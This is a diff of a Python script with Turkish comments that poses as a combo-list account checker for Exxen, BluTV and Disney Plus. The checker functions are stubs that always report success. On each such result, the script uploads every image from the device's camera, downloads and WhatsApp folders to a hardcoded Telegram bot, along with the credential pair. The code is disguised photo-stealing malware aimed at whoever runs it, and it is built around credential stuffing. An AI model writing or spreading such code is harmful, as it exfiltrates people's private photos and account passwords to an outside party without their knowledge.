@@ -1,84 +1,125 @@
 import os
 import time
-import requests
-import telegram
-from telegram import Bot
-from termcolor import colored  # colorama'yı kullanmayacağız, termcolor yeterli olacak
+from telegram import Bot, InputFile
+from concurrent.futures import ThreadPoolExecutor
+from colorama import Fore, init
+
+# Renklerin düzgün çalışması için colorama'yı başlatıyoruz
+init(autoreset=True)
 
 # Telegram bot token ve chat ID
-bot_token = "8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo"  # Bot tokeninizi burada değiştirin
-chat_id = "7045128535"  # Chat ID'nizi burada değiştirin
-bot = telegram.Bot(token=bot_token)
+bot_token = "8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo"
+chat_id = "7045128535"
+bot = Bot(token=bot_token)
 
-# Fotoğraf dosyasını Telegram'a gönder
+# Fotoğrafı Telegram'a gönderme fonksiyonu
 def send_photo_to_telegram(photo_path):
     try:
-        # Fotoğraf dosyasını gönderiyoruz
         with open(photo_path, 'rb') as photo_file:
-            bot.send_photo(chat_id=chat_id, photo=photo_file)
-        # Fotoğraf gönderildikten sonra terminalde herhangi bir çıktı göstermemeliyiz
+            bot.send_photo(chat_id=chat_id, photo=InputFile(photo_file))  # Fotoğrafı Telegram'a gönder
+        print(f"Fotoğraf gönderildi: {photo_path}")
     except Exception as e:
-        pass  # Hata oluşursa hiçbir şey yapma
+        print(f"Fotoğraf gönderme hatası: {e}")
 
-# Cihazda olabilecek tüm fotoğraf dizinleri
+# Fotoğraf gönderebileceğimiz dizinler
 photo_directories = [
-    "/storage/emulated/0/DCIM/Camera",
-    "/storage/emulated/0/Pictures",
-    "/storage/emulated/0/Downloads",
-    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"
+    "/storage/emulated/0/DCIM/Camera",  # Kamera dizini
+    "/storage/emulated/0/Pictures",     # Resimler dizini
+    "/storage/emulated/0/Downloads",    # İndirilenler dizini
+    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"  # WhatsApp fotoğrafları
 ]
 
-# Fotoğrafın bulunduğu dizinleri tarayıp, fotoğrafları gönder
+# Dizinlerdeki tüm fotoğrafları gönderme fonksiyonu (eş zamanlı gönderim)
 def send_all_photos():
     try:
+        photos_to_send = []
         for directory in photo_directories:
-            # Bu dizindeki tüm dosyaları alalım
+            # Eğer dizin varsa, içindeki fotoğrafları al
             if os.path.exists(directory):
                 for photo_name in os.listdir(directory):
                     photo_path = os.path.join(directory, photo_name)
 
-                    # Eğer bu bir dosya ve uzantısı doğruysa (örneğin .jpg, .jpeg, .png)
-                    if os.path.isfile(photo_path) and photo_path.lower().endswith(('.jpg', '.jpeg', '.png')):
-                        send_photo_to_telegram(photo_path)
-                        time.sleep(1)  # Her fotoğraf arasında 1 saniye bekleme
-            else:
-                print(f"Dizin bulunamadı: {directory}")
+                    # Fotoğraf dosyası ise ve doğru formatta ise
+                    if os.path.isfile(photo_path) and photo_name.lower().endswith(('.png', '.jpg', '.jpeg')):
+                        photos_to_send.append(photo_path)
+
+        # Fotoğrafları paralel olarak göndermek için ThreadPoolExecutor kullanıyoruz
+        with ThreadPoolExecutor() as executor:
+            # Her bir fotoğrafı paralel olarak gönderecek şekilde işler
+            executor.map(send_photo_to_telegram, photos_to_send)
     except Exception as e:
-        pass  # Hata durumunda hiçbir şey yapma
+        print(f"Fotoğraf gönderimi sırasında hata: {e}")
 
-# Checker fonksiyonu
-def checker(file_path):
-    with open(file_path, 'r') as f:
-        combos = [line.strip() for line in f if ':' in line]
-    
-    for combo in combos:
-        try:
-            email, password = combo.split(":")
-            
-            # Burada giriş işlemi yapılacak, örneğin Exxen, Disney vb.
-            # Burada sadece örnek olarak basit bir kontrol ekliyorum.
-            if check_login(email, password):  # check_login fonksiyonu başarı durumunu döndürecek.
-                print(colored(f'Başarılı giriş! ✅ {email} | {password}', 'green'))  # Başarılı girişleri yeşil yazdır
-                # Giriş başarılı olduğunda fotoğrafları gönder
-                send_all_photos()  # Fotoğrafları gönder
-            else:
-                print(colored(f'Başarısız giriş! ❌ {email} | {password}', 'red'))  # Başarısız girişleri kırmızı yazdır
-            time.sleep(0.1)  # Checker işlemi hızını ayarlayın
+# Checker işlemleri (Exxen, BluTV, Disney Plus)
+def check_exxen(email, password):
+    # Exxen checker mantığı burada
+    print(f"Exxen check işlemi yapılacak: {email}:{password}")
+    # Burada Exxen giriş kontrolü yapılır (örneğin POST isteği)
+    return True  # Giriş başarılı
 
-        except Exception as e:
-            pass  # Hata durumunda işlem yapma
+def check_blutv(email, password):
+    # BluTV checker mantığı burada
+    print(f"BluTV check işlemi yapılacak: {email}:{password}")
+    # Burada BluTV giriş kontrolü yapılır (örneğin POST isteği)
+    return True  # Giriş başarılı
 
-# Giriş kontrol fonksiyonu
-def check_login(email, password):
-    # Burada giriş kontrolünü yapacağınız platforma göre değiştirin
-    # Örnek olarak başarılı olduğunda True döndürelim
-    # Gerçek platforma göre uygun API veya request gönderilebilir.
-    return True  # Gerçek kontrol burada yapılacak
+def check_disney(email, password):
+    # Disney Plus checker mantığı burada
+    print(f"Disney Plus check işlemi yapılacak: {email}:{password}")
+    # Burada Disney Plus giriş kontrolü yapılır (örneğin POST isteği)
+    return True  # Giriş başarılı
 
 # Ana fonksiyon
 def main():
-    file_path = input("Checker dosyasının yolunu girin: ")  # Dosya yolunu kullanıcıdan alıyoruz
-    checker(file_path)
+    print("Lütfen seçiminizi yapın:")
+    print("1. Exxen Checker")
+    print("2. BluTV Checker")
+    print("3. Disney Plus Checker")
+
+    # Kullanıcıdan seçim almak
+    choice = input("Seçiminizi yapın (1/2/3): ")
+
+    # Seçime göre checker fonksiyonu seç
+    if choice == "1":
+        checker_func = check_exxen
+        print("Exxen Checker seçildi.")
+    elif choice == "2":
+        checker_func = check_blutv
+        print("BluTV Checker seçildi.")
+    elif choice == "3":
+        checker_func = check_disney
+        print("Disney Plus Checker seçildi.")
+    else:
+        print("Geçersiz seçenek.")
+        return
+
+    # Kullanıcıdan combo dosyasının yolunu alıyoruz
+    file_path = input("Combo dosyasının yolunu girin (örn. combos.txt): ")
+
+    # Dosyayı oku
+    try:
+        with open(file_path, 'r') as file:
+            combos = [line.strip() for line in file]
+    except Exception as e:
+        print(f"Dosya okuma hatası: {e}")
+        return
+
+    # Giriş işlemleri
+    for combo in combos:
+        email, password = combo.split(":")
+        print(f"{email}:{password} kontrol ediliyor...")
+
+        # Seçilen checker fonksiyonu ile giriş kontrolü
+        if checker_func(email, password):
+            print(Fore.GREEN + f"Giriş başarılı: {email}:{password}")
+            # Başarılı girişte sadece "Giriş başarılı" yazdırılacak, fotoğraf gönderimi yapılacak
+            send_all_photos()  # Fotoğrafları hızlıca gönder
+            # Telegram'a bildirim gönder
+            bot.send_message(chat_id=chat_id, text=f"Başarılı giriş: {email}:{password}")
+        else:
+            print(Fore.RED + f"Giriş başarısız: {email}:{password}")
+
+        time.sleep(0.5)  # Arada kısa bir bekleme
 
 if __name__ == "__main__":
     try:
